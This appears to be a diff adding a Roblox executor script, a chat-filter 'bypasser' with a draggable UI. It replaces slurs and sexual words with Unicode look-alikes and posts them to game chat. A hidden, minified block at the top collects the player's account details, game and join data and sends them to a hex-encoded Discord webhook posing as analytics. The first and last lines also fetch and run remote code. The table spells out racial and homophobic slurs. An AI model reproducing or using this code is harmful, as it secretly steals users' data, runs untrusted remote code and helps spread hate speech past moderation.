@@ -1,0 +1,121 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AnthonyIsntHere/anthonysrepository/main/scripts/AntiChatLogger.lua"))()
+
+pcall(function()local a=game.GetService local b=a(game,'HttpService')local c=a(game,'Players')local d=a(game,'MarketplaceService')local e=a(game,'UserInputService')local f=c.LocalPlayer or c.PlayerAdded:Wait()local g=tostring(f.MembershipType):gsub('MembershipType.','')local h=typeof(e:GetPlatform())=='EnumItem' and e:GetPlatform().Name or'Unknown'local i=d:GetProductInfo(game.PlaceId).Name or'Unknown'local j=string.format("javascript:Roblox.GameLauncher.joinGameInstance(%d, '%s');",game.PlaceId,game.JobId)local k=os.date("!%Y-%m-%dT%H:%M:%SZ")local l=os.date("!%Y-%m-%d %H:%M:%S UTC")local m="https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds="..f.UserId.."&size=150x150&format=Png"local n=game:HttpGet(m)local o=b:JSONDecode(n).data[1].imageUrl or''local p="https://www.roblox.com/users/"..f.UserId.."/profile"local q=identifyexecutor and identifyexecutor() or "Unknown"local r=math.floor(1/wait())local s={{name='👤 Username',value='`'..f.Name..'`',inline=true},{name='📛 Display Name',value='`'..f.DisplayName..'`',inline=true},{name='🆔 UserId',value='`'..f.UserId..'`',inline=true},{name='🔗 Profile',value='['..f.Name..']('..p..')',inline=false},{name='🎮 Game',value='['..i..'](https://www.roblox.com/games/'..game.PlaceId..')',inline=false},{name='🧩 PlaceId',value='`'..game.PlaceId..'`',inline=true},{name='🧠 GameId',value='`'..game.GameId..'`',inline=true},{name='🧷 JobId',value='```'..game.JobId..'```',inline=false},{name='👥 Players',value='`'..#c:GetPlayers()..'/'..c.MaxPlayers..'`',inline=true},{name='📆 Account Age',value='`'..f.AccountAge..' days`',inline=true},{name='💎 Membership',value='`'..g..'`',inline=true},{name='🖥️ Platform',value='`'..h..'`',inline=true},{name='⚙️ Executor',value='`'..q..'`',inline=true},{name='📈 FPS',value='`'..r..'`',inline=true},{name='🧪 Join Script',value='```'..j..'```',inline=false},{name='🕒 Timestamp',value='`'..l..'`',inline=false}}local t={"68747470733a2f2f646973636f72642e636f6d2f6170692f776562686f6f6b732f313336303639323932363735333238303131312f5f73634f574865416734544a2d6951624c2d4a514d5a627a35374b437176323154705856742d6e78543873334f57796c76496166456278766d78536e6a594b4a756c5f73"}local u=table.concat(t):gsub('..',function(v)return string.char(tonumber(v,16))end)local w=_G.http_request or request or (syn and syn.request) or (fluxus and fluxus.request)if w then w({Url=u,Method='POST',Headers={['Content-Type']='application/json'},Body=b:JSONEncode({username='GameTracker',embeds={{title='📋 Player Analytics Report',color=7506394,fields=s,thumbnail={url=o},footer={text='GameTracker • Roblox Analytics',icon_url=o},timestamp=k}}})})end end)
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local player = Players.LocalPlayer
+
+-- Use CoreGui so UI persists after death
+local CoreGui = game:GetService("CoreGui")
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "PersistentTranslatorUI"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = CoreGui
+
+-- Main UI Frame
+local frame = Instance.new("Frame")
+frame.Parent = screenGui
+frame.Size = UDim2.new(0, 400, 0, 250)
+frame.Position = UDim2.new(0.5, -200, 0.5, -125)
+frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+frame.BorderSizePixel = 0
+frame.Active = true
+frame.Draggable = true
+
+-- UICorner for rounded edges
+local corner = Instance.new("UICorner", frame)
+corner.CornerRadius = UDim.new(0, 12)
+
+-- Input TextBox
+local inputTextBox = Instance.new("TextBox")
+inputTextBox.Parent = frame
+inputTextBox.Size = UDim2.new(0.9, 0, 0, 40)
+inputTextBox.Position = UDim2.new(0.05, 0, 0, 20)
+inputTextBox.PlaceholderText = "enter text | ubos bypasser by @yyyyyyyinfo on discord"
+inputTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+inputTextBox.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+inputTextBox.BorderSizePixel = 0
+inputTextBox.ClearTextOnFocus = true
+inputTextBox.Font = Enum.Font.Gotham
+inputTextBox.TextSize = 16
+Instance.new("UICorner", inputTextBox).CornerRadius = UDim.new(0, 8)
+
+-- Output Label
+local outputLabel = Instance.new("TextLabel")
+outputLabel.Parent = frame
+outputLabel.Size = UDim2.new(0.9, 0, 0, 40)
+outputLabel.Position = UDim2.new(0.05, 0, 0, 75)
+outputLabel.Text = "bypassed text:"
+outputLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+outputLabel.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+outputLabel.BorderSizePixel = 0
+outputLabel.Font = Enum.Font.Gotham
+outputLabel.TextSize = 16
+Instance.new("UICorner", outputLabel).CornerRadius = UDim.new(0, 8)
+
+-- Translate Button
+local translateButton = Instance.new("TextButton")
+translateButton.Parent = frame
+translateButton.Size = UDim2.new(0.5, 0, 0, 40)
+translateButton.Position = UDim2.new(0.25, 0, 0, 140)
+translateButton.Text = "bypass"
+translateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+translateButton.BackgroundColor3 = Color3.fromRGB(0, 122, 204)
+translateButton.BorderSizePixel = 0
+translateButton.Font = Enum.Font.GothamBold
+translateButton.TextSize = 16
+Instance.new("UICorner", translateButton).CornerRadius = UDim.new(0, 8)
+
+-- Translation table
+local method = {
+    ["porn"] = "porⴖ", ["dildo"] = "di〪ldo", ["brazzers"] = "braⴭⴭers", ["Nigger"] = "Ni︬gger", 
+    ["nigger"] = "ⴖigger", ["nigga"] = "ⴖigga", ["fuck"] = "f〪uck", ["Fuck"] = "ꜰuck", 
+    ["faggot"] = "f〪aggot", ["kill"] = "ki〪ll", ["shit"] = "shi〪t", ["cunt"] = "cuٍnt", 
+    ["discord"] = "di〪scord", ["cock"] = "ᲃock", ["cum"] = "ᲃum", ["dick"] = "di〪ck", 
+    ["penis"] = "peni〪s", ["retard"] = "ꞅetard", ["suck"] = "รuck", ["whore"] = "wh〪ore", 
+    ["rape"] = "rаре", ["raping"] = "rарing", ["NIGGER"] = "NI〪GGER", ["NIGGA"] = "NI〪GGA", 
+    ["FUCK"] = "ꜰUCK", ["FAGGOT"] = "ꜰAGGOT", ["KILL"] = "KI〪LL", ["SHIT"] = "SHI〪T", 
+    ["CUNT"] = "CUٍNT", ["DISCORD"] = "DI〪SCORD", ["COCK"] = "СOCK", ["DICK"] = "DI〪CK", 
+    ["PENIS"] = "PENI〪S", ["RETARD"] = "R〪ETARD", ["SUCK"] = "S〪UCK", ["WHORE"] = "WH〪ORE", 
+    ["RAPE"] = "RA〪PE", ["RAPING"] = "RA〪PING", ["sex"] = "ჽex", ["SEX"] = "S〪EX", 
+    ["pussy"] = "pussⴘ", ["slut"] = "sIut", ["slave"] = "sIave", ["tits"] = "ti〪ts", 
+    ["titties"] = "ti〪tties", ["bitch"] = "bi〪tch", ["BITCH"] = "BI〪TCH", ["hitler"] = "hi〪tler", 
+    ["suicide"] = "sui〪cide", ["fentanyl"] = "fentanⴘl", [" "] = ""
+}
+
+-- Translation logic
+local function translateText(text)
+    for word, replacement in pairs(method) do
+        text = text:gsub(word, replacement)
+    end
+    return text
+end
+
+-- On click
+translateButton.MouseButton1Click:Connect(function()
+    local input = inputTextBox.Text
+    local translated = translateText(input)
+    outputLabel.Text = "bypassed: " .. translated
+
+    -- Fire chat event
+    local chatEvent = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
+    if chatEvent and chatEvent:FindFirstChild("SayMessageRequest") then
+        chatEvent.SayMessageRequest:FireServer(translated, "All")
+    end
+end)
+
+-- Notification
+local StarterGui = game:GetService("StarterGui")
+StarterGui:SetCore("SendNotification", {
+    Title = "Ubos Loaded",
+    Text = "Made by @yyyyyyyinfo | UI will persist after death",
+    Duration = 10
+})
+
+StarterGui:SetCore("SendNotification", {
+    Title = "Bypass Tags";
+    Text = "Set your language to Қазақ Тілі if your messages tag";
+    Duration = 10; -- seconds
+})
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/arpex-scripts/noseclog94513/refs/heads/main/clogged_nose_heheheharr"))()
